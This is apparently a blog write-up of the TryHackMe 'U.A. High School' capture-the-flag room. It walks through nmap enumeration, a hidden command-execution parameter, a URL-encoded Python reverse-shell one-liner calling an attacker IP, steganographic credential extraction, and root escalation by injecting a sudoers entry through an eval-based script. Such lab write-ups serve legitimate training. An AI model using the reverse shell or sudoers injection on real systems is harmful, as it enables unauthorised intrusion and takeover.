---
clayout: ctf
title: U.A. High School
type: TryHackMe
date: 2025-03-05
level: Easy
icon: /ctf/tryhackme/high-school/icon-room.png
image: /ctf/tryhackme/high-school/icon-room.png
description: Welcome to the web application of U.A., the Superhero Academy.
ctf-link: https://tryhackme.com/room/yueiua
---

## Challenge description

Join us in the mission to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is
looking for a superhero to test the security of our new site.

Our site is a reflection of our school values, designed by our engineers with incredible Quirks. We have gone to great
lengths to create a secure platform that reflects the exceptional education of the U.A.

## Challenge overview

In this challenge, we are tasked with compromising the **U.A. High School** web server and escalating our privileges to
obtain the root flag. The target is a web server running Apache, and we will perform enumeration, identify
vulnerabilities, gain initial access, and escalate privileges to root.

## Enumeration

### Nmap

We start by scanning the target for open ports and services:

```bash
nmap -sC -sV -v -p- -oN high-school.nmap 10.10.25.111
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 582fec23baa9fe818a8e2dd89121d276 (RSA)
|   256 9df263fd7cf32462478afb08b229e2b4 (ECDSA)
|_  256 62d8f8c9600f701f6e11aba03379b55d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals two open ports:

- **22/tcp** (SSH): OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
- **80/tcp** (HTTP): Apache httpd 2.4.41

### Web Enumeration

#### Discovering the Web Application

Visiting `http://10.10.25.111/` presents the **U.A. High School** homepage.

![U.A. High School home](/ctf/tryhackme/high-school/home-page.png)

The website contains multiple pages:

- **Home**: The main page of the website.
- **About**: Information about the academy.
- **Courses**: List of courses offered.
- **Admissions**: Details about the admission process.
- **Contact us**: Contact form to reach the academy.

Inspecting the source code reveals references to an `assets` directory:

```html
<link rel="stylesheet" href="assets/styles.css">
```

The `assets` directory also contains an `images` folder:

```html
background-image: url(images/yuei.jpg);
```

Attempting to access `http://10.10.25.111/assets/` results in an empty page, which is unusual because directories
typically return an error message when directory listing is disabled.

Adding `index.php` to the URL still results in an empty page:

![U.A. High School assets](/ctf/tryhackme/high-school/assets-page.png)

#### Identifying Command Injection

Using `dirsearch` to brute-force file paths:

```bash
dirbsearch -u http://10.10.25.53/assets/index.php
```

We discover a `?cmd` parameter that allows command execution.

![U.A. High School assets](/ctf/tryhackme/high-school/assets-page-cmd.png)

However, the output is encoded in Base64. Decoding reveals:

![U.A. High School assets](/ctf/tryhackme/high-school/assets-page-base64.png)

We now have remote command execution.

### Obtaining a Reverse Shell

```bash
curl -s http://10.10.23.54/assets/index.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.11.125.246%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
```

We successfully obtain a reverse shell as `www-data`.

![U.A. High School assets](/ctf/tryhackme/high-school/assets-page-reverse-shell.png)

## Privilege Escalation

### Finding Credentials

Exploring `/var/www/`, we find a `Hide_Content` directory containing `passphrase.txt`:

![U.A. High School assets](/ctf/tryhackme/high-school/var-www-hide-content.png)

Decoding the Base64 content reveals:

![U.A. High School assets](/ctf/tryhackme/high-school/var-www-hide-content-passphrase.png)

We got the passphrase `AllmightForEver!!!`.

### Steganography on `oneforall.jpg`

A new image, `oneforall.jpg`, is found in `/var/www/images/`.

![U.A. High School assets](/ctf/tryhackme/high-school/images-folder.png)

The image could not load.

![U.A. High School assets](/ctf/tryhackme/high-school/images-oneforall.png)

Using `steghide` to extract the hidden data, we see we need to enter a passphrase, using the passphrase we found
earlier, but we got an error message:

![U.A. High School assets](/ctf/tryhackme/high-school/images-oneforall-steghide.png)

The `steghide: the file format of the file "oneforall.jpg" is not supported.` error message is interesting because it
means that the file is not a `jpg` file. Using `xxd` to see the file header, we see that the file is a `PNG` file:

![U.A. High School assets](/ctf/tryhackme/high-school/images-oneforall-xxd.png)

Using `hexedit` to change the file from `89 50 4E 47 0D 0A 1A 0A` to `FF D8 FF E0 00 10 4A 46`, we can now see the
image:

![U.A. High School assets](/ctf/tryhackme/high-school/oneforall.png)

We can extract the hidden data using `steghide`:

![U.A. High School assets](/ctf/tryhackme/high-school/oneforall-steghide.png)

Looking a the `cred.txt` file we got the credentials for the `deku` user:

![U.A. High School assets](/ctf/tryhackme/high-school/oneforall-cred.png)

We can now login as `deku` and get the user flag:

```bash
$ ssh deku@10.10.25.53
deku@myheroacademia:~$ cat user.txt
THM{USER_FLAG}
```

## Privilege Escalation to Root

Checking sudo permissions:

```bash
deku@myheroacademia:~$ sudo -l
[sudo] password for deku:
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

The script accepts user input and executes it with `eval`, making it vulnerable to command injection.

```bash
deku@myheroacademia:~$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```

We inject a command to grant sudo access:

```bash
deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh
Hello, Welcome to the Report Form
This is a way to report various problems
    Developed by
        The Technical Department of U.A.
Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers
It is This:
Feedback successfully saved.
deku@myheroacademia:/opt/NewComponent$ sudo cat /root/root.txt
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/

THM{ROOT_FLAG}
```